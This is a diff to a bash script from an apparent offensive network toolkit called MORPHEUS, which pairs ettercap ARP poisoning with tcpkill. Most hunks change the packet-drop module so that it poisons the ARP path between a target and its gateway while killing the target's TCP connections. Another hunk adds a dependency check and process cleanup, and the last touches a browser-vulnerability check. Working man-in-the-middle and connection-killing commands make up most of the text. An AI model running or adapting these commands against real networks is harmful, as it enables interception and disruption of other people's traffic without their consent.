@@ -405,12 +405,23 @@ echo ""
 echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
 echo "${BlueF}    | ${YellowF}   This module will drop/kill any tcp/udp connections attempted   ${BlueF}|"
 echo "${BlueF}    | ${YellowF}   to/from target, droping packets from source and destination..  ${BlueF}|"
+echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
+echo "${BlueF}    | ${YellowF} 'This module uses etter filters and tcpkill to kill connections' ${BlueF}|"
 echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
 echo ""
 sleep 2
 # run module?
 rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
 if [ "$?" -eq "0" ]; then
+
+ch=`which tcpkill`
+if [ "$ch" != "/usr/sbin/tcpkill" ]; then
+echo ${RedF}[x]${white} tcpkill utility not found${RedF}!${Reset};
+sleep 1
+echo ${RedF}[x]${white} please Install:${RedF}dnsniff${white} packet...${Reset};
+sleep 3
+sh_exit
+fi
 
 # get user input to build filter
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
@@ -447,20 +458,20 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
       if [ "$IpV" = "ACTIVE" ]; then
         if [ "$LoGs" = "NO" ]; then
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/packet_drop.ef -M ARP /$rhost// /$gateway//
+        xterm -T "MORPHEUS - TCPKILL [ctrl+c to abort]" -geometry 81x40 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -M ARP /$rhost// /$gateway//
         else
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/packet_drop.ef -L $IPATH/logs/packet_drop -M ARP /$rhost// /$gateway//
+        xterm -T "MORPHEUS - TCPKILL [ctrl+c to abort]" -geometry 81x40 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -L $IPATH/logs/packet_drop -M ARP /$rhost// /$gateway//
         fi
 
       else
 
         if [ "$LoGs" = "YES" ]; then
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/packet_drop.ef -M ARP /$rhost/ /$gateway/
+        xterm -T "MORPHEUS - TCPKILL [ctrl+c to abort]" -geometry 81x40 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -M ARP /$rhost/ /$gateway/
         else
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/packet_drop.ef -L $IPATH/logs/packet_drop -M ARP /$rhost/ /$gateway/
+        xterm -T "MORPHEUS - TCPKILL [ctrl+c to abort]" -geometry 81x40 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -L $IPATH/logs/packet_drop -M ARP /$rhost/ /$gateway/
         fi
       fi
 
@@ -472,6 +483,9 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
   sleep 2
   rm $IPATH/output/packet_drop.ef > /dev/null 2>&1
   cd $IPATH
+  # stop background running proccess
+  sudo pkill ettercap > /dev/null 2>&1
+  sudo pkill tcpkill > /dev/null 2>&1
 
 else
   echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
@@ -939,7 +953,7 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
   sleep 1
 
 
-if [ $VeVul \> $nOn ]; then
+if [ "$VeVul" \> "$nOn" ]; then
 echo "${GreenF}    Browser report:${RedF} not vulnerable...${BlueF}"
 sleep 3
 echo "${RedF}[x]${white} module cant verify browser version ${RedF}(${YellowF}running blind${RedF})!"
